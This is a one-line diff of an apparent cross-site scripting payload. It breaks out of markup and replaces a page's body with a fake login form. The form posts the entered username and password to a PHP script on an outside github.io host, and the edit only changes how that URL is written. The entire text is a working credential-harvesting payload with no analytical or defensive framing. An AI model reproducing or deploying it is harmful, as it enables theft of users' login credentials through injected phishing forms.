@@ -1,1 +1,1 @@
-document.body.innerHTML='</a><br><br><center>LOGIN<form action=https://RyanLee0517.github.io/xuly.php method=POST>Username:<input name=ten><br>Password:<input name=mk type=password><br><input type=submit value=Send></form></center>'</script><!--</form>
+document.body.innerHTML='</a><br><br><center>LOGIN<form action=RyanLee0517.github.io/xuly.php method=POST>Username:<input name=ten><br>Password:<input name=mk type=password><br><input type=submit value=Send></form></center>'</script><!--</form>
